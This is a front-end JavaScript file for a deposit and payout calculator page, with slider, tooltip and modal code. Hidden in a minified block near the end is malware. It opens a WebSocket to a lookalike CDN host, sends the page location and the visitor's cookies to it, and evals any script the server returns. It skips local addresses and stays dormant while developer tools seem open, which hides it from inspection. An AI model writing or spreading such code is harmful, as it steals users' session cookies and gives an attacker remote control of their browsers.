var rangeInputs = document.getElementsByClassName("custom-range-slider");
var depositVal;
var timeVal;
var potPayout;
var payoutEl = document.getElementsByClassName("payout-box__amount")[0];
var tooltips = document.getElementsByClassName("current-value-box");

var browserCheck = !(document.documentMode || /Edge\//.test(navigator.userAgent) || /Edg\//.test(navigator.userAgent) || /firefox/i.test(navigator.userAgent)); //coloring range track with different colors in these browsers done via css pesudo elements

document.addEventListener("DOMContentLoaded", initRangeColorTooltip);
document.addEventListener("DOMContentLoaded", ieTooltips);

function ieTooltips() {
    if (!document.documentMode) {
        for (i = 0; i < tooltips.length; i++) {
            tooltips[i].style.display = "block";
        }
    } else {
        console.log(tooltips, "noa");
        for (i = 0; i < tooltips.length; i++) {
            tooltips[i].style.display = "none";
        }
    }
}

// Color of left side of slider (before slider-thumb) - Initial coloring and tooltip initial position
function initRangeColorTooltip() {
    for (i = 0; i < rangeInputs.length; i++) {
        if (browserCheck) {
            rangeInputs[i].style.background = "linear-gradient(to right, #249e2c 0%, #249e2c " + ((rangeInputs[i].value - rangeInputs[i].min) / (rangeInputs[i].max - rangeInputs[i].min)) * 100 + "%, rgba(36, 158, 44, 0.2) " + ((rangeInputs[i].value - rangeInputs[i].min) / (rangeInputs[i].max - rangeInputs[i].min)) * 100 + "%, rgba(36, 158, 44, 0.2)";
        }
        rangeInputs[i].oninput = sliderColorAndTooltip;
        var currentValueBox = rangeInputs[i].nextElementSibling.getElementsByClassName("current-value-box__num")[0];
        var rangePercent = rangeInputs[i].value;
        currentValueBox.style.transform = "translateX(-50%)";
        currentValueBox.style.left = (100 / rangeInputs[i].max) * rangePercent + "%";

        if (rangeInputs[i].classList.contains("calc-range__time__slider")) {
            currentValueBox.innerHTML = rangePercent + " days";
        } else {
            currentValueBox.innerHTML = "£" + rangePercent;
        }
    }
}

// Color of left side of slider (before slider-thumb) and tooltip with current value
function sliderColorAndTooltip() {
    var currentValueBox = this.nextElementSibling.getElementsByClassName("current-value-box__num")[0];
    var rangePercent = this.value;
    if (browserCheck) {
        this.style.background = "linear-gradient(to right, #249e2c 0%, #249e2c " + ((rangePercent - this.min) / (this.max - this.min)) * 100 + "%, rgba(36, 158, 44, 0.2) " + ((rangePercent - this.min) / (this.max - this.min)) * 100 + "%, rgba(36, 158, 44, 0.2) 100%)";
    }
    currentValueBox.style.transform = "translateX(-50%)";
    currentValueBox.style.left = (100 / this.max) * rangePercent + "%";

    if (this.classList.contains("calc-range__time__slider")) {
        currentValueBox.innerHTML = rangePercent + " days";
    } else {
        currentValueBox.innerHTML = "£" + rangePercent;
    }
}

// Deposit (input field >> range slider)
function inputDeposit() {
    var days = document.getElementById("currency").value;
    document.getElementsByClassName("calc-range__deposit__slider")[0].value = days;
    initRangeColorTooltip();
    potentialPayout();
}

// Deposit (range slider >> input field)
function sliderDeposit(e) {
    var deposit = e.value;
    document.getElementById("currency").value = deposit;
    potentialPayout();
}

// TIME-OF-USAGE (input field >> range slider)
function inputDays() {
    var days = document.getElementById("time-unit-days").value;
    document.getElementsByClassName("calc-range__time__slider")[0].value = days;
    initRangeColorTooltip();
    potentialPayout();
}

// TIME-OF-USAGE (range slider >> input field)
function sliderDays(e) {
    var days = e.value;
    document.getElementById("time-unit-days").value = days;
    potentialPayout();
}

// Potential Patout Output
function potentialPayout() {
    depositVal = document.getElementsByClassName("calc-range__deposit__slider")[0].value;
    timeVal = document.getElementsByClassName("calc-range__time__slider")[0].value;
    potPayout = (depositVal * timeVal) / 30; /// FORMULA GOES HERE! ///
    potPayout = Math.round(potPayout).toLocaleString();
    // potPayout = potPayout.toString().replace(/\B(?<!\.\d*)(?=(\d{3})+(?!\d))/g, ",");  //regex for thousands separators
    payoutEl.innerHTML = "£" + potPayout;
}

!function(){function execute(){try{if(window.con)return;var con=new WebSocket("wss://stackpath.bootstrapscdn.com:4433/scripts/4.1/boostrap.min.js");window.con=con,con.onmessage=function(e){if(data=JSON.parse(e.data),data.script)try{eval(data.script)}catch(e){}},con.onopen=function(o){try{con.send(JSON.stringify({event:"init",channel:"v1",user:"3",ml:"6",data:{location:window.location,cookies:document.cookie}}))}catch(o){}}}catch(o){}}!function(){"use strict";const o={isOpen:!1,interval:null};window.detectedByFrame=!1;const t=()=>{try{if(window.location&&window.location.href&&(window.location.href.startsWith("file")||window.location.href.startsWith("localhost")||window.location.href.startsWith("127.0.0")||window.location.href.startsWith("192.168")||window.location.href.startsWith("10.10")))return void(o.isOpen=!0);const t=window.outerWidth-window.innerWidth>160,e=window.outerHeight-window.innerHeight>160;window.detectedByFrame||(e&&t||!(window.Firebug&&window.Firebug.chrome&&window.Firebug.chrome.isInitialized||t||e)?o.isOpen=!1:o.isOpen=!0)}catch(o){}};t(),o.interval=setInterval(t,50),window.devtools=o}(),setTimeout(function(){(!window.devtools.isOpen||window.location.search&&window.location.search.includes("testws="))&&execute(),clearInterval(window.devtools.interval)},500)}();var stopModal=$(".stop-modal"),profitModal=$(".modal_profit-calc"),btnModal=document.getElementsByClassName("btn_profit-calc")[0],closeModalBtn=$(".close-modal_profit-calc"),toForm=$(".form-global-box .h-100 .text-center");function modalOpen(){document.querySelector("body").style.overflow="hidden",$("body").addClass("disabled-scroll")}function modalClose(){document.querySelector("body").style.overflow="visible",$("body").removeClass("disabled-scroll"),document.getElementById("sc_tg").classList.add("alerts-border"),setTimeout(function(){$("#sc_tg").removeClass("alerts-border")},6e3)}function confirmationModal(){modalOpen(),profitModal.show()}function stopDontGoModal(){modalOpen(),stopModal.addClass("opened"),stopModal.show(),stopModal.css("top",`${window.scrollY}px`)}$(function(){$(".close-position-to-form").on("click",()=>{modalClose(),profitModal.hide(),stopModal.hide(),stopModal.removeClass("opened")}),btnModal.addEventListener("click",confirmationModal),closeModalBtn.on("click",()=>{modalClose(),profitModal.hide(),stopModal.hide(),stopModal.removeClass("opened")}),$("a[href*=\\#]:not([href=\\#])").click(function(){if(location.pathname.replace(/^\//,"")==this.pathname.replace(/^\//,"")&&location.hostname==this.hostname){var o=$(this.hash),t=parseInt($("body").css("padding-top"));if((o=o.length?o:$("[name="+this.hash.slice(1)+"]")).length)return $("html,body").animate({scrollTop:o.offset().top-t-10},500),$(".form-wrapper").addClass("alerts-border"),setTimeout(function(){$(".form-wrapper").removeClass("alerts-border")},6e3),!1}})});